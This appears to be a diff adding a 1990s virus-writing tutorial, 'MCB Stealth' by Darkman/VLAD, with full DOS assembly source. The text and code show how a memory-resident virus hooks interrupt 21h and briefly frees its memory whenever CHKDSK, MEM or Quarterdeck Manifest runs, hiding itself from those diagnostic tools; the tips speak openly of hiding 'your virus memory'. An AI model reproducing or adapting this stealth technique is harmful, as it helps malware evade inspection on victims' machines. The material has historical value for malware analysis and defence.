@@ -1,0 +1,276 @@
+			      
+			      MCB Stealth
+			       Written by
+			      Darkman/VLAD
+
+ÄÄÄÄÄÄÄÄÄÄÄÄ
+Introduction
+ÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  If you don't know anything about direct memory allocation, Memory Control
+Blocks (MCB) and Terminate and Stay Resident programming, then this article
+might be a bit too advanced for you.
+
+  MCB Stealth is used to hide the allocated memory, by releasing the
+memory before a known memory diagnostic program is executed. When the
+program exits, the newly released memory gets allocated once again.
+
+  When a program is executed (function 4B00h), the procedure is as follows:
+    1. Check if the executed program is a known memory diagnostic program.
+    2. Find the last Memory Control Block (MCB) in chain.
+    3. Free the previously allocated memory.
+
+  When a program exits (function 4Ch and 31h), the procedure is as follows:
+    1. Check if the memory is released.
+    2. Find the last Memory Control Block (MCB) in chain.
+    3. Allocate the newly freed memory.
+
+I would like to thank Clive Sharp for helping me with the English.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Checking if the executed program is a known memory diagnostic program
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  There are quite a few ways to check if an executed program is a known memory
+diagnostic program, but I've used the following way:
+
+  First I open the file, then I get the system File Control Block (FCB) from
+the System File Table (function 1220h and 1216h) and then I close the file.
+Then I compare the filename (offset 20h) from the system File Control
+Block (FCB) against my list of filenames of known memory diagnostic programs.
+
+  These files are known memory diagnostic programs:
+    CHKDSK.EXE  DOS Chkdsk
+    MEM.EXE     DOS Mem
+    MFT.EXE     Quarterdeck Manifest
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Find the last Memory Control Block (MCB) in chain
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  If a known memory diagnostic program is being executed, then I get the
+segment of the first Memory Control Block (MCB) in the chain from Get list of
+lists (function 52h), offset -02h. The following is the description of the
+Memory Control Block (MCB):
+
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ Offset  Size    Description
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+   00h     1     Block type: 5Ah if last block in chain, otherwise 4Dh
+   01h     2     PSP segment of owner, 0000h if free, 0008h if belongs to DOS
+   03h     2     Size of memory block in paragraphs
+ ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  To find the segment of the last Memory Control Block (MCB) in the chain, I
+add the size of memory block in paragraphs (offset 03h) to the current Memory
+Control Block (MCB) and increase that by one, then I have the new Memory
+Control Block (MCB). Then I determine the block type, to see if the new Memory
+Control Block (MCB) is the last in chain, if it isn't I will continue the
+process until I find the last Memory Control Block (MCB) in chain.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Free the previously allocated memory
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  To free the previously allocated memory, I add the size of the previously
+allocated memory from the size of memory block in paragraphs (offset 03h) and
+then I execute the actual program.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Check if the memory is released
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  There are quite a few ways to check if the memory is released, I use a
+boolean variable, which tells me if the newly released memory has to be
+allocated once again. If I have to allocate the newly released memory once
+again I find the last Memory Control Block (MCB) in chain, as described above.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Allocate the newly freed memory
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+
+  To allocate the newly released memory, I subtract the size of the newly
+released memory from the size of memory block in paragraphs (offset 03h) and
+then I exit the current program.
+
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+Final tips and tricks
+ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-
+
+  - You could make sure that the executed memory diagnostic program doesn't
+    allocate your virus memory, but I don't find that necessary, because there
+    is hardly any chance of that happening.
+  - You could create a Memory Control Block (MCB) in front of your virus and
+    just modify the PSP segment owner (offset 01h).
+  - Look at the attached example.
+
+;---=<mcbsteal.asm>=-------------------------------------------=<cut here>=---
+comment *
+			  MCB stealth example
+				Code by
+			      Darkman/VLAD
+
+  To compile the MCB stealth example with Turbo Assembler v 4.0 type:
+    TASM MCBSTEAL.ASM
+    TLINK MCBSTEAL.OBJ
+    EXE2BIN MCBSTEAL.COM MCBSTEAL.EXE
+*
+
+.model tiny
+.code
+
+code:
+	     mov     ax,63fdh            ; MCB stealth example service
+	     int     21h                 ; Do it!
+	     cmp     ax,bx               ; Already resident?
+	     je      mcbstea_exit        ; Equal? Jump to mcbstea_exit
+
+	     mov     ax,ds
+	     dec     ax                  ; Decrease AX
+	     mov     ds,ax               ; DS = segment of programs MCB
+
+	     xor     di,di               ; Zero DI
+	     cmp     byte ptr ds:[di],'Z'
+	     jne     mcbstea_exit        ; Not last in chain? Jump to mcbst...
+	     sub     word ptr ds:[di+03h],(codeend-code+0fh)/10h
+	     sub     word ptr ds:[di+12h],(codeend-code+0fh)/10h
+	     mov     es,[di+12h]         ; ES = first usable program segment
+
+	     push    cs                  ; Save CS at stack
+	     pop     ds                  ; Load DS from stack (CS)
+
+	     cld                         ; Clear direction flag
+	     mov     cx,(codeend-code)   ; Move 284 bytes
+	     lea     si,code+100h        ; SI = offset of code
+	     rep     movsb               ; Move example to top of memory
+
+	     mov     ds,cx               ; DS = segment of interrupt table
+	     lea     di,int21addr        ; DI = offset of int21addr
+	     mov     si,(21h*04h)        ; SI = offset of interrupt 21h
+	     movsw                       ; Get interrupt vector 21h
+	     movsw                       ;  "      "       "     "
+	     mov     word ptr ds:[si-04h],offset mcbsteaint21
+	     mov     ds:[si-02h],es      ; Set interrupt vector 21h
+mcbstea_exit:
+	     int     20h                 ; Exit to DOS!
+
+mcbsteaint21 proc    near                ; Interrupt 21h of MCB stealth exa...
+	     cmp     ah,31h              ; Terminate and stay resident?
+	     je      test_stealth        ; Equal? Jump to test_stealth
+	     cmp     ah,4b00h            ; Load or execute a program?
+	     je      open_file           ; Equal? Jump to open_file
+	     cmp     ah,4ch              ; Terminate with return code
+	     je      test_stealth        ; Equal? Jump to test_stealth
+	     cmp     ax,63fdh            ; MCB stealth example service?
+	     jne     int21exit           ; Not equal? Jump to int21exit
+
+	     mov     bx,ax
+int21exit:
+	     db      0eah                ; Opcode of a jump far
+int21addr    dd      ?                   ; Address of interrupt 21h
+test_stealth:
+	     cmp     cs:[stealth],00h    ; Allocate memory?
+	     je      int21exit           ; Equal? Jump to int21exit
+
+	     push    ax bx ds es         ; Save registers at stack
+
+	     call    findlastmcb
+	     jne     dont_allocat        ; Not equal? Jump to dont_allocat
+
+	     not     cs:[stealth]        ; Don't free the memory
+	     sub     word ptr ds:[03h],(codeend-code+0fh)/10h
+dont_allocat:
+	     pop     es ds bx ax         ; Load registers from stack
+
+	     jmp     int21exit
+open_file:
+	     push    ax                  ; Save AX at stack
+
+	     mov     ax,3d00h            ; Open file (read)
+	     pushf                       ; Save flags at stack
+	     call    cs:[int21addr]      ; Do it!
+	     jc      dont_stealth        ; Error? Jump to dont_stealth
+
+	     push    bx cx di si ds es   ; Save registers at stack
+
+	     xchg    ax,bx               ; Exchange AX with BX
+
+	     mov     ax,1220h            ; Get system file table number
+	     int     2fh                 ; Do it! (multiplex)
+
+	     push    bx                  ; Save BX at stack
+	     mov     ax,1216h            ; Get address of system FCB
+	     mov     bl,es:[di]          ; BL = system file table entry
+	     int     2fh                 ; Do it! (multiplex)
+	     pop     bx                  ; Load BX from stack
+
+	     mov     ah,3eh              ; Close file
+	     pushf                       ; Save flags at stack
+	     call    cs:[int21addr]      ; Do it!
+
+	     push    cs                  ; Save CS at stack
+	     pop     ds                  ; Load DS at stack
+
+	     mov     cx,(names_end-names_begin)/0bh
+	     add     di,20h              ; DI = offset of filename
+	     lea     si,names_begin      ; SI = offset of names_begin
+next_name:
+	     push    cx si di            ; Save registers at stack
+
+	     mov     cl,0bh              ; Compare 11 bytes
+	     rep     cmpsb               ; Compare the filenames
+
+	     pop     di si cx            ; Load registers from stack
+	     je      free_memory         ; Equal? Jump to free_memory
+
+	     add     si,0bh              ; SI = offset of next filename
+
+	     loop    next_name
+
+	     jmp     dont_free
+free_memory:
+	     call    findlastmcb
+	     jne     dont_free           ; Not equal? Jump to dont_free
+
+	     not     cs:[stealth]        ; Free the memory
+	     add     word ptr ds:[03h],(codeend-code+0fh)/10h
+dont_free:
+	     pop     es ds si di cx bx   ; Save registers at stack
+dont_stealth:
+	     pop     ax                  ; Load AX from stack
+
+	     jmp     int21exit
+	     endp
+
+findlastmcb  proc    near                ; Find last MCB in chain
+	     mov     ah,52h              ; Get list of lists
+	     int     21h                 ; Do it!
+
+	     mov     ax,es:[bx-02h]      ; DS = segment of first MCB
+next_mcb:
+	     mov     ds,ax               ; DS = Memory Control Block (MCB)
+
+	     cmp     byte ptr ds:[00h],'M'
+	     jne     last_mcb            ; Not equal? Jump to last_mcb
+
+	     add     ax,ds:[03h]         ; AX = segment of next MCB
+	     inc     ax                  ; Increase AX
+
+	     jmp     next_mcb
+last_mcb:
+	     cmp     byte ptr ds:[00h],'Z'
+
+	     ret                         ; Return!
+	     endp
+
+stealth      db      ?                   ; Free the memory
+names_begin:
+chkdsk       db      'CHKDSK  EXE'       ; DOS Chkdsk
+mem          db      'MEM     EXE'       ; DOS Mem
+mft          db      'MFT     EXE'       ; Quarterdeck Manifest
+names_end:
+
+codeend:
+
+end          code
+;---=<mcbsteal.asm>=-------------------------------------------=<cut here>=---
